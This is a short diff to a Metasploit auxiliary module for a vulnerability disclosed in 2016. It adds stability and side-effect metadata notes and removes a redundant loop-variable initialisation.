@@ -31,7 +31,12 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],
           [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]
         ],
-        'DisclosureDate' => '2016-07-04'
+        'DisclosureDate' => '2016-07-04',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -195,7 +200,6 @@ class MetasploitModule < Msf::Auxiliary
       ending = input[(6 * k)..(input.length)]
       partnum = ''
       if ending.length > 1
-        i = 0
         startnum = false
         for i in 0..(ending.length - 2)
           isthere = false
